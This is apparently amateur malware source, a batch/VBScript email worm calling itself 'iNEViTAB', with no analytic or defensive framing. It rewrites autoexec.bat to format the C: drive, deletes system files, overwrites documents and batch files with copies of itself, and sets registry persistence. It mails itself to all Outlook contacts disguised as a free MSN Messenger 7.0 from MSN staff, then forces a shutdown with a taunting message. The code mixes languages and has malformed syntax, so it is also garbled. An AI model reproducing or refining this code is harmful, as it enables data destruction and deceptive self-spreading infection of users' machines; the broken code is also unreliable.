:start

@echo off

:copy

xcopy messenger.bat %systemdrive%\
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat

:worm

MkDir ("C:\RapRoot")
filecopy app.path + "\" + app.exename + ".exe", "C:\raproot.exe"
Set magic = CreateObject("Wscript.shell")
magic.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "DevicePath = C:\RapRoot", "Productid = Jk893-3nK-21LKoP", "Run = C:\RapRoot.exe"

set black = CreateObject ("Wscript.shell")
magic.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "SourcePath = C:\raproot", "BootDir = F:\"

:rad

echo "rd %systemroot%\ \y" >>C:\autoexec.bat
echo " del*.exe \y"
echo "del*.sys \y"
echo " del*.dll \y"
echo "del*.zip \y"
echo "copy %systemdrive%\Messenger.bat *.*doc"
echo "copy %systemdrive%\Messenger.bat *.*pdf"
echo "copy %systemdrive%\Messenger.bat *.*html"

:spread

FOR /f %%A IN ('dir /s /b /l c:\*.zip' DO C:\progra~1\winzip\winzip32.exe -min -a -r -p %0


for %%i in (dir c:\*.bat /s) do copy |y %0 + %%i %%i


dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a) if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead) if (regad="")
then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "Msn Messenger 7.0!"
male.Body = vbcrlf&"Open The Attached File To Start Downloading The New Msn Messanger 7.0."
male.Body = vbcrlf&"It's An New Free.Full Version!"
male.Body = vbcrlf&"Form Msn Staff To Everyone Using Msn Email."
male.Attachments.Add(%systemdrive%\messenger.bat") male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD" end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count end if
next
Set out=Nothing
Set mapi=Nothing
end sub

cls

:shutdown

cls >> C:\autoexec.bat
echo Your computer are now infected by an virus called "iNEViTAB". >> C:\autoexec.bat
echo If you want to get rid of it... Well simply find it out yourself! >> C:\autoexec.bat
echo Why would i tell you anyway my time by telling you? >> C:\autoexec.bat
echo Anywayz, Game's Over. >>C:\autoexec.bat
pause>nul >> C:\autoexec.bat
shutdown -s -f -t 10 >> C:\autoexec.bat
call attrib +r +h c:\autoexec.bat >nul
cacls %systemdrive%\autoexec.bat /P :F
shutdown -s -f -t 10 -C GAME'S OVER

:end 
